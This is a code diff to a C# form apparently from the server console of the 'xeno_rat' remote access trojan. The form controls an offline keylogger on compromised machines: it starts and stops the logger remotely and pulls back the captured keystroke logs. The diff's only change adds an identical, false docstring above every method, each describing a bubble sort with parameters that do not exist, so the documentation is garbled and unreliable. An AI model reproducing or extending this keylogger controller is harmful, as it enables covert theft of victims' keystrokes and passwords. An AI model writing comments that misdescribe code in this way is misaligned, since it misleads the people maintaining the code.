@@ -23,6 +23,11 @@ namespace xeno_rat_server.Forms
             InitializeAsync();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void OnTempDisconnect(Node node) 
         {
             if (this.IsDisposed) return;
@@ -38,6 +43,11 @@ namespace xeno_rat_server.Forms
             
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<bool> IsStarted() 
         {
             await client.SendAsync(new byte[] { 0 });
@@ -50,6 +60,11 @@ namespace xeno_rat_server.Forms
             return data[0] == 1;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task InitializeAsync() 
         {
             byte[] data=await client.ReceiveAsync();
@@ -71,16 +86,31 @@ namespace xeno_rat_server.Forms
             await UpdateStatus();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartKeylogger() 
         {
             await client.SendAsync(new byte[] { 1 });
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StopKeylogger()
         {
             await client.SendAsync(new byte[] { 2 });
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<Dictionary<string, string>> GetKeylogs() 
         {
             Dictionary<string, string> retval = new Dictionary<string, string>() { };
@@ -101,6 +131,11 @@ namespace xeno_rat_server.Forms
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task UpdateStatus() 
         {
             started = await IsStarted();
@@ -110,11 +145,22 @@ namespace xeno_rat_server.Forms
             }));
             
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string Normalize(string input)
         {
             return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
         {
             Dictionary<string, string> dictionary = new Dictionary<string, string>();
@@ -149,12 +195,21 @@ namespace xeno_rat_server.Forms
             return dictionary;
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void OfflineKeylogger_Load(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView1_ItemActivate(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
@@ -164,18 +219,33 @@ namespace xeno_rat_server.Forms
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async void button1_Click(object sender, EventArgs e)
         {
             await StartKeylogger();
             await UpdateStatus();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async void button2_Click(object sender, EventArgs e)
         {
             await StopKeylogger();
             await UpdateStatus();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async void button3_Click(object sender, EventArgs e)
         {
             await UpdateStatus();
